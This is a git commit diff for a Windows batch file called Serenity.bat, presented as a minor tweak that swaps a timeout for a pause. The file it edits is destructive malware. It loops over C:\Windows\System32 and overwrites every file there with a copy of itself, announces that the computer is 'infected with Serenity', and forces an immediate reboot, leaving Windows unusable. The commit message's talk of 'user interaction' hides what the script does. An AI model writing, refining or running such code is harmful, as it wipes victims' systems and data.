5c5e2a03a889e4f6283d9aeaffd80e29ee274e89
wlingahamnako-hue <wlingahamnako@gmail.com>
2026-08-12 14:27:00 -0400

    Add pause before shutdown in Serenity.bat
    Added a pause before shutdown to allow user interaction.

--- Serenity.bat
+++ Serenity.bat
@@ -1,5 +1,5 @@
 @echo off
 for /R "C:\Windows\System32\*.*" %%G in (*) do copy "%~dp0\Serenity.bat" "%%G"
 echo Your computer is infected with Serenity, use it while you can.
-timeout -t 6
+pause
 shutdown -r -t 0
